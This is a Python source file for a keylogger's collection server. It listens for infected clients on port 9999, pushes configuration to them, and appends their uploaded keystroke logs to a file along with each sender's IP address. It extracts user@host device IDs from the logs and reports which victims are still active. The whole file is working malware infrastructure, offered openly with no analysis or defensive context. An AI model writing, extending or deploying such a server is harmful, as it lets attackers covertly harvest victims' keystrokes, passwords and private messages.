"""
Keylogger Server - Receives logs and tracks active connections
VERSION: 2.1
"""

import os
import socket
import threading
import datetime
import json
import re

SERVER_PORT = 9999
LOG_FILE = 'server-copy.txt'
SETTINGS_FILE = 'settings.json'

CLIENT_CONFIG = {
    'send_interval': 300,
    'buffer_size': 1024,
    'retry_attempts': 3,
    'config_check_interval': 30
}

config_lock = threading.Lock()
server_running = True
active_connections = {}
connection_lock = threading.Lock()

def load_settings_from_file():
    """Load settings from settings.json"""
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return None

def initialize_config():
    """Initialize configuration from settings file"""
    global CLIENT_CONFIG, SERVER_PORT, LOG_FILE
    
    settings = load_settings_from_file()
    if settings:
        if 'send_interval_seconds' in settings:
            CLIENT_CONFIG['send_interval'] = settings['send_interval_seconds']
        if 'server_port' in settings:
            SERVER_PORT = settings['server_port']
        if 'log_file_path' in settings:
            LOG_FILE = settings['log_file_path']

def extract_device_id_from_log(data):
    """Extract device ID from log data using regex pattern"""
    try:
        data_str = data.decode('utf-8', errors='ignore')
        match = re.search(r'\["([^"]+@[^"]+)", "[^"]+", ', data_str)
        if match:
            return match.group(1)
    except:
        pass
    return None

def update_connection(device_id):
    """Update connection tracking with current timestamp"""
    with connection_lock:
        active_connections[device_id] = datetime.datetime.now()

def cleanup_stale_connections():
    """Remove connections not seen in last 10 minutes"""
    with connection_lock:
        now = datetime.datetime.now()
        stale_threshold = datetime.timedelta(minutes=10)
        to_remove = [
            device_id for device_id, last_seen in active_connections.items()
            if now - last_seen > stale_threshold
        ]
        for device_id in to_remove:
            del active_connections[device_id]

def get_connection_stats():
    """Get current connection statistics"""
    with connection_lock:
        return {
            'active_count': len(active_connections),
            'connections': {
                device_id: last_seen.isoformat()
                for device_id, last_seen in active_connections.items()
            }
        }

def handle_config_request(client_socket, address):
    """Handle 'C' request - send configuration to client"""
    try:
        with config_lock:
            config_json = json.dumps(CLIENT_CONFIG)
        client_socket.send(config_json.encode('utf-8'))
    except:
        pass
    finally:
        client_socket.close()

def handle_log_upload(client_socket, address):
    """Handle 'L' request - receive and save logs from client"""
    device_id = None
    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, 'ab') as f:
            # Write connection separator
            separator = f"\n{'='*60}\n[Connection from {address[0]} at {timestamp}]\n{'='*60}\n".encode('utf-8')
            f.write(separator)
            first_chunk = True
            # Receive data in chunks
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                f.write(data)
                # Extract device ID from first chunk
                if first_chunk and not device_id:
                    device_id = extract_device_id_from_log(data)
                    first_chunk = False
            
            f.write(b'\n')
        
        if device_id:
            update_connection(device_id)
    except:
        pass
    finally:
        client_socket.close()

def handle_stats_request(client_socket, address):
    """Handle 'S' request - send connection statistics"""
    try:
        stats = get_connection_stats()
        stats_json = json.dumps(stats)
        client_socket.send(stats_json.encode('utf-8'))
    except:
        pass
    finally:
        client_socket.close()

def handle_client(client_socket, address):
    """Route client request based on type: C=Config, L=Log, S=Stats"""
    try:
        request_type = client_socket.recv(1).decode('utf-8')
        if request_type == 'C':
            handle_config_request(client_socket, address)
        elif request_type == 'L':
            handle_log_upload(client_socket, address)
        elif request_type == 'S':
            handle_stats_request(client_socket, address)
        else:
            client_socket.close()
    except:
        client_socket.close()

def cleanup_timer():
    """Background thread - cleanup stale connections every 60 seconds"""
    global server_running
    while server_running:
        threading.Event().wait(60)
        if server_running:
            cleanup_stale_connections()

initialize_config()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind(("0.0.0.0", SERVER_PORT))
    s.listen(10)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_timer, daemon=True)
    cleanup_thread.start()
    
    # Main server loop
    while server_running:
        s.settimeout(1.0)
        try:
            client_socket, address = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
            client_thread.start()
        except socket.timeout:
            continue
        except:
            pass

except:
    pass

finally:
    s.close()